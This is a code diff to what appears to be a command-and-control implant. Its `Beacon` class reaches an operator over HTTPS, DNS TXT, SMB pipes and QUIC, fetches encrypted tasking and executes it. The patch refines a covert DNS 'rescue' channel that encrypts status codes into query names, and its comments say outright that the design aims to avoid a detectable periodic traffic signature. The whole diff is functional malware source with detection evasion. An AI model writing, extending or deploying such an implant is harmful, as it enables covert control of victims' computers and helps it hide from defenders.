@@ -1554,7 +1554,8 @@ def _unpack_socks_ip(family: int, tail: bytes, size: int,
 _DNS_PORT = 53
 
 
-def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
+def _dns_query(name: str, qtype: str, server: str, timeout: float = 10,
+               status: Optional[dict] = None) -> list:
     """Minimal DNS query using raw UDP sockets. Returns list of strings (TXT) or IPs (A)."""
     qtypes = {"A": 1, "TXT": 16}
     qtype_num = qtypes.get(qtype.upper(), 1)
@@ -1584,6 +1585,11 @@ def _dns_query(name: str, qtype: str, server: str, timeout: float = 10) -> list:
 
     _, resp_flags, qdcount, ancount = struct.unpack("!HHHH", data[:8])
     rcode = resp_flags & 0x0F
+    # The caller may need to tell a resolver that said SERVFAIL from one
+    # that answered with nothing: an empty list alone conflates them, and
+    # the rescue channel's whole trigger rests on the difference.
+    if status is not None:
+        status["rcode"] = rcode
     if rcode != 0:
         return []
 
@@ -1722,7 +1728,16 @@ def _rescue_class_of(exc: BaseException) -> int:
     By type and never by message: a message can carry a hostname or a URL,
     and this value is about to be encrypted into a DNS query name that
     every resolver on the path can see the length of.
+
+    The wrapper is unwrapped first. `_HttpSession` raises `URLError` around
+    the real cause, so judging the outer type alone reported a refused
+    connection, a TLS failure and a timeout all as "unreachable" -- three
+    different things for an operator to do, collapsed into one useless
+    word.
     """
+    reason = getattr(exc, "reason", None)
+    if isinstance(reason, BaseException):
+        exc = reason
     if isinstance(exc, ssl.SSLError):
         return _RESCUE_CLASSES["tls_failed"]
     if isinstance(exc, ConnectionRefusedError):
@@ -4613,7 +4628,11 @@ class Beacon:
             # A proxy that exists and refused us is a different situation
             # from no proxy at all, and the operator needs to know which.
             self._rescue_flags |= _RESCUE_FLAG_PROXY_FOUND
-            self._record_leg("https", _RESCUE_CLASSES["auth_required"], 0)
+            # _ProxyError covers every proxy problem, including one that
+            # refused the connection or timed out. Only a 407 means it
+            # wants credentials, and that is recorded above where the
+            # status code is actually known.
+            self._record_leg("https", _rescue_class_of(e))
             try:
                 direct = _HttpSession()
                 direct.trust_env = False
@@ -4768,13 +4787,24 @@ class Beacon:
             encoded_id = base64.b32encode(agent.encode()).decode().rstrip("=").lower()
             query = f"{encoded_id}.b.{self.dns_domain}"
 
-            results = _dns_query(query, "TXT", self.dns_resolver, timeout=10)
-            # The resolver answered. Whether it carried tasking is a
-            # separate question, and conflating the two is what makes a
-            # DNS-only beacon unexplainable: `None` from here would
-            # otherwise mean both "no route out" and "nothing queued".
-            self._rescue_flags |= _RESCUE_FLAG_DNS_ANSWERED
-            self._record_leg("dns", _RESCUE_CLASSES["answered"])
+            status = {}
+            results = _dns_query(query, "TXT", self.dns_resolver, timeout=10,
+                                 status=status)
+            rcode = status.get("rcode", 0)
+            if rcode:
+                # SERVFAIL and NXDOMAIN are not answers. Recording them as
+                # one would send a rescue into a resolver that will never
+                # carry it -- noise with no recipient, which is the one
+                # thing the trigger is meant to prevent.
+                self._record_leg("dns", _RESCUE_CLASSES["resolve_failed"],
+                                 rcode)
+            else:
+                # The resolver answered. Whether it carried tasking is a
+                # separate question, and conflating the two is what makes a
+                # DNS-only beacon unexplainable: `None` from here would
+                # otherwise mean both "no route out" and "nothing queued".
+                self._rescue_flags |= _RESCUE_FLAG_DNS_ANSWERED
+                self._record_leg("dns", _RESCUE_CLASSES["answered"])
             for txt in results:
                 try:
                     return self._decrypt(txt)
@@ -5036,6 +5066,7 @@ class Beacon:
                                          action="beacon" if self._registered
                                          else "register"))
             if not self._smb_write_pipe(sock, payload.encode()):
+                self._record_leg("smb", _RESCUE_CLASSES["bad_payload"])
                 return None
             resp_data = self._smb_read_pipe(sock)
             if not resp_data:
@@ -5154,6 +5185,7 @@ class Beacon:
                 return None
         except Exception as e:
             logger.debug("QUIC beacon failed: %s", e)
+            self._record_leg("quic", _rescue_class_of(e))
             return None
 
     def _beacon_quic(self) -> Optional[dict]:
@@ -7574,6 +7606,7 @@ class Beacon:
                 if tasking and tasking.get("success"):
                     self._registered = True
 
+            from_rescue = False
             if tasking is None:
                 # Nothing got through. If the resolver has shown it
                 # answers, say why -- once, and in the same exchange that
@@ -7583,6 +7616,7 @@ class Beacon:
                 # assignment inside the failure arm would be collected and
                 # then dropped, because the arm that dispatches is an elif.
                 tasking = self._maybe_rescue()
+                from_rescue = tasking is not None
 
             if tasking is None:
                 self._consecutive_failures += 1
@@ -7590,14 +7624,18 @@ class Beacon:
                     logger.info("Re-registering after %d failures", self._consecutive_failures)
                     self._registered = False
                     self._register_https()
-            elif tasking:
-                self._consecutive_failures = 0
-                self._leg_recovered()
-                logger.debug("Tasking: %s", tasking.get("cmd", "?"))
-                self._process_tasking_batch(tasking)
             else:
                 self._consecutive_failures = 0
-                self._leg_recovered()
+                # Only a real leg re-arms the latch. The rescue's own reply
+                # must not: it would arm it, the next dead cycle would send
+                # another, and since the operator's answer to a rescue is a
+                # next attempt to try, that is one query per cycle -- the
+                # periodic signature the latch exists to avoid.
+                if not from_rescue:
+                    self._leg_recovered()
+                if tasking:
+                    logger.debug("Tasking: %s", tasking.get("cmd", "?"))
+                    self._process_tasking_batch(tasking)
 
             if self._consecutive_failures > 3:
                 self._backoff_sleep()
